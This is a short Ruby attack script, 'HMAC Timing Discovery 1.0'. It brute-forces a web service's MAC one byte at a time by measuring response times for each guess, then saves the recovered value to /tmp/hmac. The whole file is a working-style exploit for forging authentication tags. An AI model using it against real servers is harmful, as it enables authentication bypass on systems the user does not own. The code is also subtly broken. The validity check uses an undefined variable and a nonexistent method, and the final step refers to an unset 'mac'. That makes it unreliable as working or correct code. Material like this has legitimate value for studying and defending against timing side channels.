#! /usr/bin/env ruby

require 'net/http'
require 'uri'
#
# Check arguments
#
if ARGV.size != 2
  puts "[+] HMAC Timing Discovery 1.0"
  puts "[+] Usage: #{__FILE__} <target url> <mac guess>"
  exit 1
end
#
# Setup
#
url      = ARGV[0]
base_mac = ARGV[1]
out_file = '/tmp/hmac'
#
# Store response time in a struct
#
ResponseTime = Struct.new(:mac, :time)
#
# Gets reponse time for a given URI
# 
# URI::HTTP -> Fixnum
#
def get_response_time(uri)
  t0 = Time.now
  res = Net::HTTP.get_response(uri)

  Time.now - t0
end
#
# Checks a supplied mac is valid
#
# HEX -> Boolean
#
def valid?(mac, url)
  Net::HTTP.get_response(uri).status_code == '200'
end
#
# ASCII -> HEX String
#
def ascii_s(hex_s)
  [hex_s].pack('H*')
end
#
# HEX -> ASCII String
#
def hex_s(ascii_s)
  ascii_s.unpack('H*')[0]
end
#
# Guess byte at given index
# 
# ASCII, HEX -> HEX
#
def guess_next_byte(url, mac)
  (0..255).reduce(ResponseTime.new(mac, 0)) { |result, byte|
    tmp_mac = mac + hex_s(byte.chr)
    t       = get_response_time(URI.parse(url + tmp_mac))

    print "[+] Calculating..." + tmp_mac + "\r"
    
    if t > result.time
      result.time = t
      result.mac  = tmp_mac
    end

    result
      
  }.mac
end
#
# MAIN
# 
puts "[+] Starting timing attack...."

valid_mac = ascii_s(base_mac).chars.reduce('') do |mac, char|
  mac = guess_next_byte(url, mac)
end

puts "[+] Done"
puts "[+] Checking validity...."

if valid?(mac, url)
  puts "[+] Success: #{valid_mac}"
  File.write(out_file, mac)
else
  puts "[-] Error: server responded with non-success code"
end
